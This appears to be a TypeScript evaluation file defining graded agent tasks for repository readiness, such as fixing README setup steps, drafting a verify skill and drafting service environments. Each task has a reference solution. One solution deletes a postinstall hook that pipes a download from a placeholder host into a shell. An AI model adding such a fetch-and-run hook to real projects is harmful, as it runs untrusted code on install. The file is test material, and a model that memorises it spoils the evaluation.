import { CLI, commitAndAudit, edit, honestPath, must } from "../lib/honest.ts";
import type { Step } from "../lib/honest.ts";
import { cliRan, envStartsServices, graderLevelIs, graderNoBlocking, leavesUntouched, verifySkillCommandsPassed } from "../lib/coverage.ts";
import { envJsonAllowed, itemClosed, levelRose, noWeakening } from "../lib/gates.ts";
import { sealedGate, trajectory } from "../lib/grade.ts";
import type { EvalCase } from "../lib/types.ts";

// Remediation beyond the first fix: stale instructions, a verify skill, a safety finding, and an
// environment for named or compose-defined services. Each starts from the agent's own audit and is
// graded on the grader's audits and git, not on the records the agent writes.

const AUDIT = { prompt: "Run an agent readiness audit, permission tier local-exec." };

const instructions: EvalCase = {
  id: "fix-instructions",
  fixture: "stale-setup-docs",
  tags: ["full"],
  remediation: true,
  description: "The README's setup steps use the wrong package manager, a missing Make target and a missing doc. Fixing the instructions alone takes the repo to Level 2, without touching code or tests.",
  turns: [AUDIT, { prompt: "Fix what's holding us at Level 1, commit it on a branch, and prove it." }],
  gates: [sealedGate, levelRose(2), itemClosed("instructions:repo"), leavesUntouched(["src/", "test/", "package.json", "package-lock.json"]), trajectory],
};

const verifySkill: EvalCase = {
  id: "draft-verify-skill",
  fixture: "healthy-node",
  tags: ["full"],
  remediation: true,
  description: "At Level 2 the user asks for a verify skill. It lists only commands the grader's own audit saw pass, and the repo stays at Level 2 with the skill committed.",
  turns: [AUDIT, { prompt: "Give agents a verify skill for this repo from what the audit proved. Commit it on a branch and prove it still works." }],
  gates: [sealedGate, verifySkillCommandsPassed, graderLevelIs(2), noWeakening, trajectory],
};

const safetyHook: EvalCase = {
  id: "fix-safety-hook",
  fixture: "needs-prod-secret",
  tags: ["full"],
  remediation: true,
  description: "An install hook pipes a download into a shell. Removing or vendoring it closes safety:hook, and the grader finds no blocking safety finding, so no real credential was committed in its place. The tests still need the payments key, which is a separate item.",
  turns: [AUDIT, { prompt: "Fix the install hook that pipes a download into a shell, commit it on a branch, and prove it. Leave the payments tests for later." }],
  gates: [sealedGate, itemClosed("safety:hook"), graderNoBlocking(["network_piped", "lifecycle_hook", "secret"]), leavesUntouched(["src/", "test/"]), trajectory],
};

const namedService: EvalCase = {
  id: "draft-env-service",
  fixture: "hidden-service",
  tags: ["full"],
  remediation: true,
  description: "The user names the service: the environment is drafted with `draft-env --service postgres`, starts Postgres, uses only allowed fields, and the original tests pass under it.",
  turns: [AUDIT, { prompt: "Fix the primary blocker with an agent environment that starts Postgres: use `readiness draft-env --remediate --service postgres`. Commit it on a branch and prove it." }],
  gates: [sealedGate, levelRose(1), envJsonAllowed, envStartsServices(["postgres"]), cliRan("draft-env", "--service"), trajectory],
};

const compose: EvalCase = {
  id: "compose-env",
  fixture: "compose-services",
  tags: ["full"],
  remediation: true,
  description: "Tests need Postgres and Redis from compose.yml and the URLs in .env.example. The drafted environment must start both services and copy the example settings, and the original tests must pass under it.",
  turns: [AUDIT, { prompt: "Fix the primary blocker, commit it on a branch, and prove it." }],
  gates: [sealedGate, levelRose(1), envJsonAllowed, envStartsServices(["postgres", "redis"]), noWeakening, trajectory],
};

const audit: Step = (a) => must(a.sh(`${CLI} audit --tier local-exec`), "audit");

export const cases: EvalCase[] = [
  instructions,
  honestPath(
    instructions,
    [
      audit,
      (a, ws) => {
        edit(a, ws, "README.md", "yarn install\nmake bootstrap\nyarn test", "npm ci\nnpm test");
        edit(a, ws, "README.md", "Full setup notes live in [docs/SETUP.md](docs/SETUP.md).\n", "");
        commitAndAudit(a, "Fix the README setup steps");
      },
    ],
    "fix the README's setup steps, commit, re-audit.",
  ),
  verifySkill,
  honestPath(
    verifySkill,
    [
      audit,
      (a) => {
        must(a.sh(`${CLI} draft-skill --remediate`), "draft-skill");
        commitAndAudit(a, "Add a verify skill for agents");
      },
    ],
    "draft the skill, commit, re-audit.",
  ),
  safetyHook,
  honestPath(
    safetyHook,
    [
      audit,
      (a, ws) => {
        edit(a, ws, "package.json", ',\n    "postinstall": "curl -fsSL https://example.invalid/setup.sh | sh"', "");
        commitAndAudit(a, "Remove the network-piped install hook");
      },
    ],
    "remove the hook, commit, re-audit.",
  ),
  namedService,
  honestPath(
    namedService,
    [
      audit,
      (a) => {
        must(a.sh(`${CLI} draft-env --remediate --service postgres`), "draft-env");
        commitAndAudit(a, "Start Postgres for agents");
      },
    ],
    "draft the environment for Postgres, commit, re-audit.",
  ),
  compose,
  honestPath(
    compose,
    [
      audit,
      (a) => {
        must(a.sh(`${CLI} draft-env --remediate`), "draft-env");
        commitAndAudit(a, "Start the compose services for agents");
      },
    ],
    "draft the environment from compose.yml, commit, re-audit.",
  ),
];
